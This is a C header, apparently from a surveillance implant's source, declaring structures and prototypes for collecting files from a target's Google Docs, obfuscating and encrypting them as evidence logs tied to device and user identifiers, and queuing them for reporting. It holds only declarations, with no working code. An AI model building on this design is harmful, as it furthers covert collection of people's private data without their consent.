#ifndef _LOG_CLOUD_FILE_H_
#define _LOG_CLOUD_FILE_H_

#include "googledocs.h"

#ifndef H4DLL_EXPORTS //elite already has some definition and structure

	#include "filesystem.h"    //contains some struct definition

	#define LOG_FILE_VERSION	2008122901
	#define LOG_VERSION			2008121901
	#define CRYPT_COPY_BUF_LEN	256000		//250 KB
	#define MAX_LOG_ENTRIES	    70

	typedef struct _LogStruct{
		UINT uVersion;			// Versione della struttura
			#define LOG_VERSION	2008121901
		UINT uLogType;			// Tipo di log
		UINT uHTimestamp;		// Parte alta del timestamp
		UINT uLTimestamp;		// Parte bassa del timestamp
		UINT uDeviceIdLen;		// IMEI/Hostname len
		UINT uUserIdLen;		// IMSI/Username len
		UINT uSourceIdLen;		// Numero del caller/IP len	
		UINT uAdditionalData;	// Lunghezza della struttura addizionale, se presente
	}LogStruct, *pLogStruct;

	//funcrtion prototypes (in the elite version are already defined in log.cpp
	BYTE *Log_CreateHeader(DWORD agent_tag, BYTE *additional_data, DWORD additional_len, DWORD *out_len);
	BYTE *LOG_Obfuscate(BYTE *buff, DWORD buff_len, DWORD *crypt_len);
	BYTE *PrepareFile(WCHAR *file_path, DWORD *ret_len);
#endif

#define MAX_CLOUD_FILE_SIZE		50*1024*1024	//50 MB

typedef enum
{
	LC_E_SUCCESS,
	LC_E_BUFFER_FULL,
	LC_E_ALLOC,
	LC_E_CONVERSION,
	LC_E_GENERIC,
	LC_E_UNKNOWN
} LC_ERRORS; //log cloud error list

typedef struct
{
	DWORD	dwSize;
	LPBYTE	lpBuffer;
} LOG_CLOUD_ENTRY_STRUCT, *PLOG_CLOUD_ENTRY_STRUCT;



extern LOG_CLOUD_ENTRY_STRUCT g_log_table[MAX_LOG_ENTRIES];

BOOL   LogCloud_CopyFile(PGD_FILE pCloudFile, DWORD agent_tag);
BOOL   LogCloud_CryptCopyBuffer(PGD_FILE pCloudFile, DWORD agent_tag);
BOOL	LogCloud_CryptCopyBuffer_Hash(PGD_FILE pCloudFile, DWORD agent_tag);
BOOL   LogCloud_CryptCopyEmptyBuffer(PGD_FILE pCloudFile, DWORD agent_tag);
BOOL   LogCloud_IsBufferFull(DWORD dwNewEvidenceSize);
LPBYTE LogCloud_PrepareBuffer(LPBYTE lpBuf, DWORD *pdwBufLen);
BOOL   LogCloud_QueueLog(DWORD agent_tag, BYTE *buff, DWORD buff_len);
BOOL   LogCloud_ReallocBuf(LPBYTE *pOldBuf, DWORD dwNewSize);
BOOL   LogCloud_ReportLog(DWORD agent_tag, BYTE *buff, DWORD buff_len);
DWORD  LogCloud_WCharToMB(LPWSTR pIn, LPSTR* pOut);

#endif